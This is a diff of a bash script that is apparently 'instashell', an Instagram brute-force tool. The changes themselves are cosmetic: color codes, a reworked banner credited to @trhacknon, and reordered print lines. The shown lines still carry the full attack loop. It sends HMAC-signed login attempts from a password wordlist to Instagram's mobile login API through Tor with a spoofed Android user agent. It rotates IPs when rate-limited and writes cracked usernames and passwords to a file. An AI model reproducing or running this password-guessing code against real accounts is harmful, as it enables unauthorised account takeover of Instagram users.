@@ -2,6 +2,15 @@
 # Coded by: github.com/dhasirar
 # Instagram: @dhasirar
 
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[1;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
+
 trap 'store;exit 1' 2
 string4=$(openssl rand -hex 32 | cut -c 1-4)
 string8=$(openssl rand -hex 32  | cut -c 1-8)
@@ -42,16 +51,13 @@ fi
 }
 
 banner() {
-
-printf "\e[1;77m     _                              \e[0m\n"
-printf "\e[1;77m _  | |                _            \e[0m\n"
-printf "\e[1;77m( \ | | ____    ___  _| |_  _____   \e[0m\n"
-printf "\e[1;80m ) )| ||  _ \  /___)(_   _)(____ |  \e[0m\n"
-printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ |  \e[0m\n"
-printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|  \e[0m\n"
-printf "\n"
-printf "\e[1;50m\e[40m  Instagram Brute Force Tool by @dhasirar(IG)   \e[0m\n"
-printf "\n"
+  printf "${RED}     _                              \n"
+  printf "${ORANGE} _  | |                _            \n"
+  printf "${YELLOW}( \ | | ____    ___  _| |_  _____   \n"
+  printf "${GREEN}) )|| |   _ \\  /___)(_   _)(____ |  \n"
+  printf "${BLUE}(_/ | || | | ||___ |  | |_ / ___ |  \n"
+  printf "${PURPLE}    |_||_| |_|(___/    \\__)\\_____|  \n\n"
+  printf "${CYAN}  Instagram Brute Force Tool by @trhacknon(IG)   ${NC}\n\n"
 }
 
 function start() {
@@ -104,7 +110,7 @@ mkdir sessions
 fi
 IFS=$'\n'
 countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
-printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $user $pass $wl_pass $countpass > sessions/store.session.$user.$(date +"%FT%H%M")
+printf ${BLUE}"user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $user $pass $wl_pass $countpass > sessions/store.session.$user.$(date +"%FT%H%M"${NC})
 printf "\e[1;77mSession saved.\e[0m\n"
 printf "\e[1;92mUse ./instashell --resume\n"
 else
@@ -146,12 +152,12 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 let token++
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
+printf "${BLUE}\e[1;77mTrying pass (%s/%s)\e[0m: %s\n${NC}" $countpass $count_pass $pass #token
 
 {(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
 
-let startline+=$threads
-let endline+=$threads
+startline=$((startline + threads))
+endline=$((endline + threads))
 changeip
 done
 exit 1
@@ -196,19 +202,22 @@ header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www
 
 data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
+
 IFS=$'\n'
 countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
+
 let token++
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
+printf "${BLUE}\e[1;77mTrying pass (%s/%s)\e[0m: %s\n${NC}" $countpass $count_pass $pass #token
+
+{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
+
 let token--
 changeip
 done
 exit 1
 }
-
 case "$1" in --resume) resume ;; *)
 start
 bruteforcer
